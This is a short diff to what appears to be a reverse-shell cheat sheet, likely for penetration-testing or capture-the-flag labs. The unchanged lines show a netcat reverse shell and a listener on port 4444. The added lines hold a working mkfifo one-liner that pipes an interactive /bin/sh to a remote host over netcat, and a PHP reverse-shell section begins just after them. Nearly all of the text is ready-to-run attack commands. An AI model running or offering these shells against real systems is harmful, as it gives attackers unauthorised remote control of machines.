@@ -6,6 +6,10 @@ nc 10.10.14.36 4444 -e /bin/sh
 ## Listener
 nc -lnvp 4444
 
+## Generic mkfifo reverse shell
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc 10.11.8.219 4444 >/tmp/f
+```
 ## PHP mkfifo reverse shell
 ```php
 <?php
